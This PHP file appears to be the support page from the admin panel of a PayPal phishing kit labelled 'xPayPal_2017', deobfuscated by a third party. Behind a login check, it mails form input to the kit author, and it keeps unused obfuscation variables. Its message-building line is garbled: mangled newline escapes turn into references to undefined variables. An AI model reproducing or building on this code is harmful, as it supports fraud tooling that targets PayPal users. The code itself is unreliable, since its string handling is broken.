<?php
// Decoded by Girudatsu.com Member

$JLlhxrQ_ = 'header';
$vQVsN_X = 'base64_decode';
$yeuP_TbASfxh = 'chr';
$_cK_c_lEs_mNQ = 'chr';
$gpDDec_ = 'chr';
$ajMWBNZhA = 'chr';
$jXlwAgUtl = 'chr';
$rNeHRiCleJ = 'chr';
@session_start();
if (!isset($_SESSION['login_success'])) {
    @header('Location: ../index.php');
    exit;
}
if (isset($_POST['z_name'])) {
    $pdo = new PDO('sqlite:database.db');
    if ($pdo) {
        $z_name = $_POST['z_name'];
        $z_email = $_POST['z_email'];
        $z_subject = $_POST['z_subject'];
        $z_message = $_POST['z_message'];
        $that_msg = '' . 'name: ' . "{$z_namenemail}" . ': ' . "{$z_emailnsubject}" . ': ' . "{$z_subjectnmessage}" . ': ' . "{$z_messagen}";
        $settings = $pdo->query('SELECT * FROM `settings`')->fetch(PDO::FETCH_ASSOC);
        if ($settings) {
            $aKEyNHzqltGj = 'mail';
            $send_it = @mail($settings['author_email'], 'xPayPal_2017 [SUPPORT] ' . $z_subject, $that_msg);
        }
        if ($send_it) {
            echo 'done';
        } else {
            echo 'fail';
        }
        exit;
    }
}
?>
<script src="js/support.js" type="text/javascript"></script>
<div id="title_1">Support:</div>
<div id="mailer">
	<table>
		<tr>
			<td>Name</td>
			<td><input type="text" name="z_name" id="z_name"></td>
		</tr>
		<tr>
			<td>Email</td>
			<td><input type="text" name="z_email" id="z_email"></td>
		</tr>
		<tr>
			<td>Subject</td>
			<td><input type="text" name="z_subject" id="z_subject"></td>
		</tr>
		<tr>
			<td>Message</td>
			<td><textarea name="z_message" id="z_message"></textarea></td>
		</tr>
		<tr>
			<td></td>
			<td><button type="button" id="send_mail">Send</button></td>
		</tr>
	</table>
</div>
